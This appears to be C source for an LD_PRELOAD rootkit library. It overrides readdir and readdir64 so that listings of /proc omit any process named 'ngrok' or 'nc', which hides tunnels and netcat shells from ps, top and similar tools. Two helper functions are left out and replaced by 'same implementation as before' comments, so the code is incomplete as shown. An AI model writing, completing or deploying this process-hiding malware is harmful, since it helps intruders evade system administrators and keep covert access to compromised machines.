#define _GNU_SOURCE

#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>

/*
 * Every process with these names will be excluded
 */
static const char* processes_to_filter[] = {
    "ngrok",
    "nc"
};

/*
 * Get a directory name given a DIR* handle
 */
// (Same implementation as before)

/*
 * Get a process name given its pid
 */
// (Same implementation as before)

#define DECLARE_READDIR(dirent, readdir)                                \
static struct dirent* (*original_##readdir)(DIR*) = NULL;               \
                                                                        \
struct dirent* readdir(DIR *dirp)                                       \
{                                                                       \
    if(original_##readdir == NULL) {                                    \
        original_##readdir = dlsym(RTLD_NEXT, #readdir);               \
        if(original_##readdir == NULL)                                  \
        {                                                               \
            fprintf(stderr, "Error in dlsym: %s\n", dlerror());         \
        }                                                               \
    }                                                                   \
                                                                        \
    struct dirent* dir;                                                 \
                                                                        \
    while(1)                                                            \
    {                                                                   \
        dir = original_##readdir(dirp);                                 \
        if(dir) {                                                       \
            char dir_name[256];                                         \
            char process_name[256];                                     \
            if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &&        \
                strcmp(dir_name, "/proc") == 0 &&                       \
                get_process_name(dir->d_name, process_name)) {          \
                int filter_process = 0;                                 \
                for (size_t i = 0; i < sizeof(processes_to_filter) / sizeof(processes_to_filter[0]); i++) { \
                    if (strcmp(process_name, processes_to_filter[i]) == 0) { \
                        filter_process = 1;                             \
                        break;                                          \
                    }                                                   \
                }                                                       \
                if (filter_process) {                                   \
                    continue;                                           \
                }                                                       \
            }                                                           \
        }                                                               \
        break;                                                          \
    }                                                                   \
    return dir;                                                         \
}

DECLARE_READDIR(dirent64, readdir64);
DECLARE_READDIR(dirent, readdir);
